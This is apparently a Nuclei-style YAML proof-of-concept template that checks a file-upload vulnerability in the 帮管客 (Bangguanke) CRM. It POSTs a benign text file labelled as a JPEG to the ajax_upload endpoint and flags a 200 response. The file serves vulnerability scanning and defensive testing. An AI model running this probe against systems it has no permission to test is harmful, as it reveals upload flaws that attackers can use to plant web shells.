id: poc-yn7skxyutyg3o0sm
info:
  name: 帮管客CRM 文件上传漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: file-upload,2024
http:
- raw:
  - 'POST /index.php/upload/ajax_upload HTTP/1.1


    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8


    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2


    Accept-Encoding: gzip, deflate


    Upgrade-Insecure-Requests: 1


    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryv1WbOn5o


    ------WebKitFormBoundaryv1WbOn5o


    Content-Disposition: form-data; name="file"; filename="dudesite.txt"


    Content-Type: image/jpeg


    dudesite


    ------WebKitFormBoundaryv1WbOn5o--


    # 响应代码特征

    200


    # 响应内容特征

    dudesite.txt


    # 上传文件定位

    暂无'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
